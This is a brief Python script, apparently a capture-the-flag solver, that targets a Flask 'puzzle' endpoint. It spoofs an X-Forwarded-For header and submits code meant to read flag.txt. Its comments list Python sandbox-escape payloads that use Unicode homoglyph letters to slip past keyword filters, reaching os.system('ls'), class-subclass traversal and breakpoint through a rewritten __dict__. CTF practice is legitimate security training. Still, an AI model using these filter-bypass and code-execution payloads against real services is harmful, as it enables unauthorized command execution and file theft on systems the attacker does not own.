import requests

# The base URL of the Flask server
base_url = "http://18001c7a-c50c-4088-a350-9bc330c48b77.anveshanam.net:8001/"  # Change this to the actual URL of your Flask server if different

# Create a session to maintain cookies
session = requests.Session()

# The required headers
headers = {
    'X-Forwarded-For': '192.168.35.4'  # Adjust this IP if needed
}

# Step 1: Access the main page to set the session
main_page_response = session.get(base_url + "/", headers=headers)
print("Main Page Response:", main_page_response.text)

# # Step 2: Make a POST request to /puzzle with the solution
puzzle_url = base_url + "/puzzle"
solution = "open('flag.txt').read"  # Replace with your actual solution

# Make the POST request to solve the puzzle
response = session.post(puzzle_url, headers=headers, data={'solution': solution})
print("Puzzle Response:", response.text)

#getattr(getattr(𝔤𝔩𝔬𝔟𝔞𝔩𝔰()['_＿𝔟uiltin𝔰_＿'],'_＿im'+'port_＿')('o'+'s'),'sys'+'tem')('ls')

#_＿𝔠𝔩𝔞𝔰𝔰_＿._＿𝖇𝖆𝖘𝖊𝖘_＿_＿𝖘𝖚𝖇𝖈𝖑𝖆𝖘𝖘𝖊𝖘_＿

#open('flag.txt').read()

#𝖘etattr(copyright,'_＿dict_＿',𝔤𝔩𝔬𝔟𝔞𝔩𝔰()),delattr(copyright,'𝔟reakpoint'),𝔟reakpoint